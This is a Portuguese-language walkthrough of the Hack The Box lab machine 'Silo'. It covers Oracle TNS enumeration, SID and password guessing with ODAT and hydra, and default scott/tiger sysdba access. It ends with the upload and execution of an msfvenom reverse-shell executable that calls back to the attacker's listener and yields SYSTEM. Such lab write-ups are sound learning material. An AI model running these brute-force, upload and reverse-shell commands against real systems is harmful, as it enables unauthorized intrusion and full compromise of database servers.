Silo
========================

# Enumeration

    sudo nmap_enum silo.htb
    
![qownnotes-media-aZxNuU](../../../media/qownnotes-media-aZxNuU.png)

Próximo passo foi abrir o browser para verificar web:

![qownnotes-media-tQlxRv](../../../media/qownnotes-media-tQlxRv.png)


## RPC enumeration

    rpcclient -N -U '' 10.10.10.82

Sem sucesso
 
## UDP Enumeration

    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn 10.10.10.82 | tee nmap_udp_output.txt

![qownnotes-media-ZyHuhQ](../../../media/qownnotes-media-ZyHuhQ.png)


## All ports enumeration

    sudo nmap -T5 -Pn -p- 10.10.10.82 | tee nmap_allports_output.txt
     
 ![qownnotes-media-tmdjkx](../../../media/qownnotes-media-tmdjkx.png)

## Oracle Enumeration

Com base nisso, comecei a verificar que o problema poderia estar possivelmente no Oracle... Então prosseguimsos para este cara:

    sudo nmap -p 1521 -sV 10.10.10.82
    
    searchsploit tns listener
    
    nmap --script "oracle-tns-version" -p 1521 -T4 -sV 10.10.10.82
    
![qownnotes-media-BJxfYQ](../../../media/qownnotes-media-BJxfYQ.png)

Comecei a instalar ferramentas:

    sudo apt install tnscmd10g
    
    tnscmd10g version -p 1521 -h 10.10.10.82
    
    tnscmd10g version --10G -p 1521 -h 10.10.10.82
    
    hydra -P /usr/share/wordlists/rockyou.txt -t 32 -s 1521 10.10.10.82 oracle-listener
    
Tudo sem sucesso:

![qownnotes-media-FVvnyO](../../../media/qownnotes-media-FVvnyO.png)

Outra abordagem, com outra ferramenta:

https://github.com/quentinhardy/odat/blob/master-python3/README.md

Instalei o standalone desse cara com o seguintes comandos:

    wget https://github.com/quentinhardy/odat/releases/download/5.1.1/odat-linux-libc2.17-x86_64.tar.gz
    
    tar -xzvf odat-linux-libc2.17-x86_64.tar.gz
    
    cd odat-libc2.17-x86_64/
    
    sudo ln -s /media/owncloud/Area_de_trabalho/tools/linux/3-exploitation/odat/standalone/odat-libc2.17-x86_64/odat /usr/bin/odat
    
    odat sidguesser -s 10.10.10.82
    
![qownnotes-media-DpCTIX](../../../media/qownnotes-media-DpCTIX.png)

Descobrimos o SID do banco de dados:

XE

# Exploitation

Primeira tentativa é:

    odat passwordguesser -s 10.10.10.82 -d 'XE'

Vale coniderar que a ferramenta já utiliza um arquivo com senhas]

![qownnotes-media-xoEYuk](../../../media/qownnotes-media-xoEYuk.png)

Vamos tentar dessa forma primeiro

    odat passwordguesser -s 10.10.10.82 -d 'XE' --accounts-files login_certo.txt password_certo.txt

![qownnotes-media-GpQJaK](../../../media/qownnotes-media-GpQJaK.png)

    msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.14.4 LPORT=80 > rshell.exe
    
    odat utlfile -s 10.10.10.82 -d 'XE' -U scott -P tiger --sysdba --putFile 'C:\Users\Public\Documents' 'rshell.exe' 'rshell.exe'
    
    dat externaltable -s 10.10.10.82 -d 'XE' -U scott -P tiger --sysdba --exec 'C:\Users\Public\Documents' 'rshell.exe'

    nc -nlvp 80

![qownnotes-media-sjQTOf](../../../media/qownnotes-media-sjQTOf.png)

![qownnotes-media-siKecl](../../../media/qownnotes-media-siKecl.png)

![qownnotes-media-jgcASx](../../../media/qownnotes-media-jgcASx.png)

Já entramos como system

![qownnotes-media-FzpHBg](../../../media/qownnotes-media-FzpHBg.png)

